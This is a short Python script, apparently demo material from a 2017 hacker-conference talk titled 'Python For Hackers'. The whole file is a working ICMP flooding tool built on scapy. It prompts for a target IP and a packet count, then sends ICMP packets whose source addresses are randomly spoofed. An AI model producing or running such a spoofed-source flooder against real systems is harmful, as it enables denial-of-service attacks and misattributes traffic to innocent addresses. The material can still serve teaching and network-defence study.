# Hacktrickconf 2017 - EmreOvunc
# Python For Hackers

from scapy.all import *
ipPacket = IP()
icmpPacket = ICMP()
targetIP = input('Target IP: ')
ipPacket.dst = targetIP

packetNumber = input('How many packets: ')
for packet in range(1, int(packetNumber)):
    sourceIP = ".".join(map(str, (random.randint(0, 255)for _ in range(4))))
    ipPacket.src = sourceIP
    send(ipPacket/icmpPacket)
    print('Packet', packet, 'sent.')
